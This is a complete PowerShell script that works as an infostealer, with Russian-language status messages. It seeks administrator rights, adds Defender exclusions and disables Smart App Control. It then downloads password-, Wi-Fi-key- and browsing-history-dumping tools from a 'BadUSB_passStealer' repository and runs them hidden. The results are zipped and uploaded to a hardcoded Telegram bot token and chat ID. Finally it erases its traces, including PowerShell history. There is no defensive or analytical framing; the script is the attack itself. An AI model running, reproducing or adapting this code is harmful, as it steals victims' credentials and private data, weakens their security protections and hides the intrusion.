[CmdletBinding()]
param(
    [string]$Token,
    [string]$ChatID,
    [int]$HistoryDays = 7
)

if (-not $Token)  { $Token  = '9144321837:AAHrcLLsQqlZGQNXFdry99NnBKfTIHLCK90' }
if (-not $ChatID) { $ChatID = '1859879540' }

$ErrorActionPreference = 'Continue'
$ProgressPreference    = 'SilentlyContinue'
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    $self = $PSCommandPath
    if (-not $self) { $self = 'C:\Users\Public\p.ps1' }
    for ($k = 1; $k -le 3; $k++) {
        try {
            Start-Process -FilePath 'powershell.exe' -ArgumentList @('-NoExit','-ep','bypass','-File',$self) -Verb RunAs -ErrorAction Stop
            exit
        } catch {
            Write-Host "!! UAC отклонён (попытка $k)" -ForegroundColor Yellow
            Start-Sleep 2
        }
    }
    Write-Host '!! права не получены, продолжаю без администратора' -ForegroundColor Yellow
}

$log = 'C:\Users\Public\pslog.txt'
function S($m) { Write-Host ">> $m" -ForegroundColor Cyan; try { Add-Content $log ("[{0}] {1}" -f (Get-Date -Format HH:mm:ss), $m) } catch {} }

S "admin=$isAdmin  user=$env:USERNAME  ps=$($PSVersionTable.PSVersion)"

$pub = $env:PUBLIC
if (-not $pub) { $pub = 'C:\Users\Public' }

$basePath   = Join-Path $pub 'scripts'
$dumpFolder = Join-Path $basePath ('{0}-{1}' -f $env:USERNAME, (Get-Date -Format yyyy-MM-dd))
$dumpFile   = $dumpFolder + '.zip'
S "basePath=$basePath"

New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
Set-Location $basePath

Add-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath $pub -Force -ErrorAction SilentlyContinue
S 'exclusions'

$ciKey   = 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy'
$prevSac = (Get-ItemProperty $ciKey -Name VerifiedAndReputablePolicyState -ErrorAction SilentlyContinue).VerifiedAndReputablePolicyState
S "prevSac=$prevSac"
Set-ItemProperty $ciKey -Name VerifiedAndReputablePolicyState -Type DWord -Value 0 -ErrorAction SilentlyContinue
& CiTool --refresh --json | Out-Null

$tools = [ordered]@{
  'WirelessKeyView.exe'     = 'https://github.com/tuconnaisyouknow/BadUSB_passStealer/raw/main/other_files/WirelessKeyView.exe'
  'WebBrowserPassView.exe'  = 'https://github.com/tuconnaisyouknow/BadUSB_passStealer/raw/main/other_files/WebBrowserPassView.exe'
  'BrowsingHistoryView.exe' = 'https://github.com/tuconnaisyouknow/BadUSB_passStealer/raw/main/other_files/BrowsingHistoryView.exe'
  'WNetWatcher.exe'         = 'https://github.com/tuconnaisyouknow/BadUSB_passStealer/raw/main/other_files/WNetWatcher.exe'
}
foreach ($t in $tools.Keys) {
  $dst = Join-Path $basePath $t
  for ($i = 0; $i -lt 3; $i++) {
    try { Invoke-WebRequest $tools[$t] -OutFile $dst -UseBasicParsing -TimeoutSec 60; S "dl ok $t"; break }
    catch { S ("dl FAIL $t #$i " + $_.Exception.Message); Start-Sleep 2 }
  }
}

$jobs = @(
  @{ exe='WNetWatcher.exe';         args=@('/stext','connected_devices.txt'); wait=10 },
  @{ exe='BrowsingHistoryView.exe'; args=@('/HistorySource','1','/VisitTimeFilterType','2','/VisitTimeFilterNumberOfDays',"$HistoryDays",'/stext','history.txt'); wait=30 },
  @{ exe='WebBrowserPassView.exe';  args=@('/stext','passwords.txt'); wait=25 },
  @{ exe='WirelessKeyView.exe';     args=@('/stext','wifi.txt'); wait=20 }
)

foreach ($j in $jobs) {
  $exe = Join-Path $basePath $j.exe
  if (-not (Test-Path $exe)) { S "skip no-exe $($j.exe)"; continue }
  $out = Join-Path $basePath $j.args[-1]
  S "run $($j.exe)"
  try { Start-Process -FilePath $exe -ArgumentList $j.args -WorkingDirectory $basePath -WindowStyle Hidden } catch { S ("start FAIL " + $_.Exception.Message) }
  $n = 0
  while ($n -lt $j.wait -and -not (Test-Path $out)) { Start-Sleep 1; $n++ }
  Start-Sleep 2
  Get-Process -Name ([IO.Path]::GetFileNameWithoutExtension($j.exe)) -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
  S "done $($j.exe) out=$(Test-Path $out)"
}

$files = 'passwords.txt','wifi.txt','connected_devices.txt','history.txt' |
         ForEach-Object { Join-Path $basePath $_ } | Where-Object { Test-Path $_ -PathType Leaf }
S "files: $($files -join ', ')"
if (-not $files) { S 'NO FILES'; Read-Host 'Enter'; exit 1 }

Move-Item $files -Destination $dumpFolder -Force -ErrorAction SilentlyContinue
Compress-Archive -Path (Join-Path $dumpFolder '*') -DestinationPath $dumpFile -Force -ErrorAction SilentlyContinue
S "zip=$(Test-Path $dumpFile)"
if (-not (Test-Path $dumpFile)) { S 'NO ZIP'; Read-Host 'Enter'; exit 1 }

if (-not ('System.Net.Http.HttpClient' -as [type])) {
  $p = Get-ChildItem 'C:\Windows\Microsoft.NET\Framework64\' -Recurse -Filter 'System.Net.Http.dll' -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName
  if ($p) { Add-Type -Path $p; S 'http dll ok' } else { S 'http dll MISSING'; Read-Host 'Enter'; exit 1 }
}

$uri  = "https://api.telegram.org/bot$Token/sendDocument"
$sent = $false
for ($i = 0; $i -lt 3 -and -not $sent; $i++) {
  $fs = $null; $client = $null; $content = $null
  try {
    $client  = New-Object System.Net.Http.HttpClient
    $client.Timeout = [TimeSpan]::FromMinutes(5)
    $content = New-Object System.Net.Http.MultipartFormDataContent
    $content.Add((New-Object System.Net.Http.StringContent($ChatID)), 'chat_id')
    $content.Add((New-Object System.Net.Http.StringContent("$env:COMPUTERNAME / $env:USERNAME")), 'caption')
    $fs = [IO.File]::OpenRead($dumpFile)
    $sc = New-Object System.Net.Http.StreamContent($fs)
    $sc.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse('application/octet-stream')
    $content.Add($sc, 'document', [IO.Path]::GetFileName($dumpFile))
    $resp = $client.PostAsync($uri, $content).GetAwaiter().GetResult()
    S "tg #$i status=$([int]$resp.StatusCode)"
    if ($resp.IsSuccessStatusCode) { $sent = $true }
  } catch { S ("tg #$i ex " + $_.Exception.Message); Start-Sleep 5 }
  finally {
    if ($fs) { $fs.Close(); $fs.Dispose() }
    if ($content) { $content.Dispose() }
    if ($client) { $client.Dispose() }
  }
}
S "sent=$sent"

Set-Location $pub
Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
Remove-Item (Join-Path $pub 'p.ps1') -Force -ErrorAction SilentlyContinue
Remove-MpPreference -ExclusionPath $basePath -Force -ErrorAction SilentlyContinue
Remove-MpPreference -ExclusionPath $pub -Force -ErrorAction SilentlyContinue
if ($null -ne $prevSac) { Set-ItemProperty $ciKey -Name VerifiedAndReputablePolicyState -Type DWord -Value $prevSac -ErrorAction SilentlyContinue }
& CiTool --refresh --json | Out-Null

$ws = New-Object -ComObject WScript.Shell
1..4 | ForEach-Object { $ws.SendKeys('{CAPSLOCK}'); Start-Sleep 1 }
Clear-Content (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
S 'END'
Read-Host 'Enter'
exit
